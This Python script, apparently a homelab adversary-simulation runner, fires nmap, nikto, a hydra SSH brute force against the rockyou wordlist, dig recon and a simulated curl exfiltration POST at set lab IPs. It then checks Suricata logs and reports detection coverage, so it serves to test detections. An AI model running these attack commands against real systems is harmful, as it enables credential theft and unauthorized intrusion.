#!/usr/bin/env python3
"""
GhostNet NullByte v1.0 — Adversary Simulation Runner
Runs from Kali (192.168.248.130) against homelab targets.
WARNING: Authorized homelab use only.

Author: Elie Fuentes (enak223)
"""

import argparse, json, logging, subprocess, sys, time
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from pathlib import Path
from typing import Callable, Optional

logging.basicConfig(level=logging.INFO, format="%(asctime)s [NullByte] %(message)s")
log = logging.getLogger("ghostnet.nullbyte")

TARGETS = {
    "ubuntu_web": "192.168.248.139",
    "windows":    "192.168.248.128",
    "ubuntuai":   "192.168.248.20",
    "kali":       "192.168.248.130",
}

@dataclass
class AttackResult:
    module: str
    technique_id: str
    technique_name: str
    tactic: str
    target: str
    command: str
    exit_code: int
    stdout: str
    stderr: str
    duration_sec: float
    alert_verified: bool = False
    verification_note: str = ""
    timestamp: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())

class NullByteRunner:
    def __init__(self, verify_alerts=True, eve_log="/var/log/suricata/eve.json"):
        self.results = []
        self.verify_alerts = verify_alerts
        self.eve_log = Path(eve_log)

    def _run(self, module, technique_id, technique_name, tactic, target, cmd, timeout=60):
        cmd_str = " ".join(cmd)
        log.info(f"[{module}] {cmd_str}")
        t0 = time.time()
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            ec, out, err = proc.returncode, proc.stdout[:2000], proc.stderr[:500]
        except subprocess.TimeoutExpired:
            ec, out, err = -1, "", f"Timed out after {timeout}s"
        except FileNotFoundError as e:
            ec, out, err = -2, "", f"Tool not found: {e}"
        duration = round(time.time() - t0, 2)
        result = AttackResult(module=module, technique_id=technique_id, technique_name=technique_name,
                              tactic=tactic, target=target, command=cmd_str,
                              exit_code=ec, stdout=out, stderr=err, duration_sec=duration)
        self.results.append(result)
        log.info(f"[{module}] Done in {duration}s — exit {ec}")
        return result

    def _verify_eve(self, keywords, lookback_sec=120):
        if not self.eve_log.exists():
            return False, "EVE log not found"
        found = []
        try:
            for line in open(self.eve_log):
                try:
                    evt = json.loads(line)
                except: continue
                if evt.get("event_type") != "alert": continue
                sig = evt.get("alert", {}).get("signature", "").lower()
                if any(kw.lower() in sig for kw in keywords):
                    found.append(sig)
        except PermissionError:
            return False, "Permission denied on EVE log"
        if found:
            return True, f"Matched: {found[0][:100]}"
        return False, f"No match for: {keywords}"

    def module_recon(self, target=TARGETS["ubuntu_web"]):
        log.info("=" * 55 + "\nMODULE: recon — nmap -sV (T1046)")
        r = self._run("recon","T1046","Network Service Discovery","Reconnaissance",
                      target, ["nmap","-sV","-sC","--open","-T4",target], timeout=120)
        time.sleep(5)
        r.alert_verified, r.verification_note = self._verify_eve(["scan","nmap","port"], 180)
        log.info(f"[recon] Verified: {r.alert_verified} — {r.verification_note}")
        return r

    def module_web_attack(self, target=TARGETS["ubuntu_web"]):
        log.info("=" * 55 + "\nMODULE: web_attack — nikto (T1190)")
        r = self._run("web_attack","T1190","Exploit Public-Facing Application","Initial Access",
                      target, ["nikto","-h",f"http://{target}","-maxtime","60s"], timeout=90)
        time.sleep(5)
        r.alert_verified, r.verification_note = self._verify_eve(["nikto","web","http","sql"], 180)
        return r

    def module_brute_force(self, target=TARGETS["ubuntu_web"], user="ubuntu",
                            wordlist="/usr/share/wordlists/rockyou.txt"):
        log.info("=" * 55 + "\nMODULE: brute_force — hydra SSH (T1110)")
        wl = wordlist if Path(wordlist).exists() else "/usr/share/wordlists/fasttrack.txt"
        r = self._run("brute_force","T1110","Brute Force","Credential Access",
                      target, ["hydra","-l",user,"-P",wl,"-t","4","-f",f"ssh://{target}","-e","nsr"],
                      timeout=120)
        time.sleep(5)
        r.alert_verified, r.verification_note = self._verify_eve(
            ["brute","ssh","authentication","invalid user"], 180)
        return r

    def module_exfil_sim(self, target=TARGETS["ubuntu_web"]):
        log.info("=" * 55 + "\nMODULE: exfil_sim — curl 5MB POST (T1041)")
        pf = Path("/tmp/ghostnet_exfil_test.bin")
        pf.write_bytes(subprocess.run(
            ["dd","if=/dev/urandom","bs=1M","count=5"], capture_output=True, timeout=10).stdout)
        r = self._run("exfil_sim","T1041","Exfiltration Over C2 Channel","Exfiltration",
                      target, ["curl","-s","-X","POST","-H","Content-Type: application/octet-stream",
                               "--data-binary",f"@{pf}",f"http://{target}/","--max-time","30"],
                      timeout=45)
        pf.unlink(missing_ok=True)
        time.sleep(5)
        r.alert_verified, r.verification_note = self._verify_eve(
            ["exfil","large","upload","transfer"], 180)
        return r

    def module_dns_recon(self, target=TARGETS["ubuntu_web"]):
        log.info("=" * 55 + "\nMODULE: dns_recon — dig (T1590.002)")
        r = self._run("dns_recon","T1590.002","DNS","Reconnaissance",
                      target, ["dig","any",target,"+nocmd","+multiline","+noall","+answer"],
                      timeout=30)
        return r

    def coverage_report(self):
        total = len(self.results)
        verified = sum(1 for r in self.results if r.alert_verified)
        report = {
            "generated": datetime.now(timezone.utc).isoformat(),
            "summary": {
                "total_modules_run": total,
                "alerts_verified": verified,
                "detection_rate_pct": round((verified/total*100) if total else 0, 1),
            },
            "coverage_gaps": [
                {"module":r.module,"technique":r.technique_id,"note":r.verification_note}
                for r in self.results if not r.alert_verified
            ],
            "results": [asdict(r) for r in self.results],
        }
        outfile = f"nullbyte_coverage_{datetime.now().strftime('%Y%m%d_%H%M')}.json"
        with open(outfile,"w") as f: json.dump(report, f, indent=2)
        log.info(f"\n{'='*55}\nNULLBYTE COVERAGE REPORT")
        log.info(f"  Modules run    : {total}")
        log.info(f"  Alerts verified: {verified}")
        log.info(f"  Detection rate : {report['summary']['detection_rate_pct']}%")
        for gap in report["coverage_gaps"]:
            log.info(f"  GAP [{gap['technique']}] {gap['module']}: {gap['note']}")
        log.info(f"  Report: {outfile}\n{'='*55}")
        return report

def main():
    parser = argparse.ArgumentParser(description="NullByte — GhostNet adversary simulation")
    parser.add_argument("--modules", nargs="+",
        choices=["recon","web_attack","brute_force","exfil_sim","dns_recon","all"], default=["all"])
    parser.add_argument("--target", default=TARGETS["ubuntu_web"])
    parser.add_argument("--no-verify", action="store_true")
    parser.add_argument("--eve-log", default="/var/log/suricata/eve.json")
    args = parser.parse_args()

    runner = NullByteRunner(verify_alerts=not args.no_verify, eve_log=args.eve_log)
    mods = args.modules
    if "all" in mods:
        mods = ["dns_recon","recon","web_attack","brute_force","exfil_sim"]

    module_map = {
        "recon":       lambda: runner.module_recon(args.target),
        "web_attack":  lambda: runner.module_web_attack(args.target),
        "brute_force": lambda: runner.module_brute_force(args.target),
        "exfil_sim":   lambda: runner.module_exfil_sim(args.target),
        "dns_recon":   lambda: runner.module_dns_recon(args.target),
    }

    log.info(f"NullByte starting — modules: {mods} | target: {args.target}")
    log.info("REMINDER: Authorized homelab use only\n")

    for mod in mods:
        try: module_map[mod]()
        except Exception as e: log.error(f"Module {mod} failed: {e}")
        time.sleep(10)

    runner.coverage_report()

if __name__ == "__main__":
    main()
